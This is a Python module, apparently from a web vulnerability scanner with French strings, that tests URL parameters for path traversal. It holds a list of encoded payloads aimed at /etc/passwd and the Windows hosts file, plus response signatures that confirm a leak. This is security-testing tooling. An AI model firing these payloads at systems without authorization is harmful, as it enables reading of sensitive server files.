"""
Module VulnScan Pro : directory_traversal
Teste les vulnérabilités de type Path Traversal (../../etc/passwd).
"""
import sys
import json
import argparse
import time
import re
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

sys.path.insert(0, '..')
from core.base_module import BaseModule

DIR_TRAVERSAL_REFS = [
    "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
    "https://cwe.mitre.org/data/definitions/22.html",
    "https://portswigger.net/web-security/file-path-traversal",
]


TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
]

TRAVERSAL_SIGNATURES = [
    r'root:x:0:0',
    r'\[boot loader\]',
    r'# localhost',
    r'daemon:.*:/usr/sbin',
    r'\[fonts\]',
]


class Module(BaseModule):

    def _is_vulnerable(self, text: str) -> bool:
        for sig in TRAVERSAL_SIGNATURES:
            if re.search(sig, text, re.IGNORECASE):
                return True
        return False

    def _test_param(self, base_url: str, param: str, original_val: str,
                    session: requests.Session, timeout: int) -> tuple:
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        for payload in TRAVERSAL_PAYLOADS:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = payload
            new_query = urlencode(test_params)
            test_url = urlunparse(parsed._replace(query=new_query))
            try:
                resp = session.get(test_url, timeout=timeout, allow_redirects=True)
                if self._is_vulnerable(resp.text):
                    return True, payload, test_url
            except Exception:
                continue
        return False, None, None

    def run(self, url: str, depth: str = "normal", timeout: int = 30) -> dict:
        start = time.time()
        vulns = []
        tested_params = set()

        try:
            session = requests.Session()
            session.headers["User-Agent"] = "VulnScan-Pro/1.0"

            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            # Test parameters in the URL
            for param, values in params.items():
                if param in tested_params:
                    continue
                tested_params.add(param)
                vulnerable, payload, vuln_url = self._test_param(
                    url, param, values[0], session, min(timeout // max(len(params), 1), 8)
                )
                if vulnerable:
                    vulns.append(self.vuln(
                        name="Path Traversal détecté",
                        severity="HIGH",
                        cvss_score=7.5,
                        cvss_vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                        cwe_id="CWE-22",
                        endpoint=vuln_url or url,
                        parameter=param,
                        payload=payload,
                        description=(
                            f"Le paramètre '{param}' est vulnérable au Path Traversal. "
                            "Un attaquant peut lire des fichiers système arbitraires du serveur."
                        ),
                        impact="Lecture de fichiers système (/etc/passwd, clés SSH, configs), fuite d'informations sensibles.",
                        evidence=f"Payload '{payload}' a retourné des signatures de fichiers système dans la réponse.",
                        recommendation=(
                            "Valider et assainir tous les chemins de fichiers. "
                            "Utiliser une liste blanche de chemins autorisés. "
                            "Appliquer le principe du moindre privilège sur les fichiers accessibles."
                        ),
                        references=DIR_TRAVERSAL_REFS,
                    ))

        except requests.exceptions.Timeout:
            duration = int((time.time() - start) * 1000)
            return self.error("directory_traversal", "Timeout", duration)
        except requests.exceptions.ConnectionError as e:
            duration = int((time.time() - start) * 1000)
            return self.error("directory_traversal", f"Connexion impossible : {e}", duration)
        except Exception as e:
            duration = int((time.time() - start) * 1000)
            return self.error("directory_traversal", str(e), duration)

        duration = int((time.time() - start) * 1000)
        return self.result("directory_traversal", vulns, duration)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="VulnScan Pro — Directory Traversal")
    parser.add_argument("--url",     required=True,        help="URL cible")
    parser.add_argument("--depth",   default="normal",     help="Profondeur du scan")
    parser.add_argument("--timeout", type=int, default=30, help="Timeout en secondes")
    args = parser.parse_args()

    module = Module()
    result = module.run(args.url, args.depth, args.timeout)
    print(json.dumps(result, ensure_ascii=False))
